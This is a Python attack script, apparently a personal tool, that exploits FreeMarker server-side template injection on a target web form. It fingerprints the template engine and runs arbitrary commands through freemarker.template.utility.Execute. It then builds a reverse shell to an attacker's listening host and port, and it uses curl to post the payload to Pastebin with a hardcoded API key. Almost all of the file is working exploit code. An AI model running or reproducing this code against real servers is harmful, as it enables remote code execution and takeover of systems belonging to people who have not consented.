import argparse
import requests
from datetime import datetime
import autorev
import subprocess
import shlex
import os


# functions
def response(stri):
    a = stri.split('*')
    return "".join(
        a[i + 1]
        for i, n in enumerate(a)
        if n == 'realbacon' and a[i + 1] != 'realbacon'
    ).strip()


def inject(payload):
    d = {
        post_data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("' + payload + '") }*realbacon*'}
    p = requests.post(args.url, data=d)
    return p.text


print('		Freemarker template injection made by Realbacon v1.0\n\n')

# parsing arguments
parser = argparse.ArgumentParser(description='All this arguments are required :')
parser.add_argument('-u', type=str, dest='url', required=True,help='Url of the target')
parser.add_argument('-d', dest='data', required=True,help='POST variable to inject')
parser.add_argument('-lhost', dest='lhost', required=True,help='Ip to listen on')
parser.add_argument('-lport', dest='lport', required=True,help='Port to listen on')

args = parser.parse_args()

url, post_data,lhost,lport = args.url,args.data,args.lhost,args.lport

# try to get a response from the url
try:
    r = requests.get(args.url)

except:
    print('[-] Invalid url')
    exit()
data_fr = {post_data: "${{7*'7'}}"}
data_sr = {post_data: "*realbacon*${.version}*realbacon*"}
fr = requests.post(args.url, data_fr)
sr = requests.post(args.url, data_sr)

# Try to see if the website is running FREEMARKER
if 'freemarker' in fr.text:
    print(f'[+] Url : {args.url} seems to run with FREEMARKER {response(sr.text)}')
else:
    print(f'[-]Url : {args.url} does not seem to run with FREEMARKER (maybe not injectable)')
    if input('Do you want to continue injection ? (y/n)') == 'n': exit()


# Try to see if we can get back the data from command injection
print(f'[+] Trying injection with post data : {post_data}')
data_test = {
    post_data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*realbacon*'}
payload_test = requests.post(args.url, data=data_test)


if response(payload_test.text) == '$baconed$':
    print('[+] Injection successfull\n[+] Opening shell')
else:
    # We dont get a response so we close the program
    print("[-]Target does not seem to be injectable...\n[-]Aborting...")
    exit()


# retrive date
now = datetime.now()
time_display = now.strftime("%d/%m/%Y %H:%M:%S")

# open the shell
print(f'\n[+] Shell opened at {time_display}\n[+] Check your netcat window')

payload = autorev.create(lhost,lport)
api = f"bacon='{payload}'; curl -d 'api_paste_code=$bacon' 'https://pastebin.com/api/api_post.php' -d 'api_dev_key=8YVBhzemNtfyF_HPSVEUMDtqm_MOP3Sc' -X POST -d 'api_option=paste'"

a = os.popen(api)
read = a.read()
print(read)






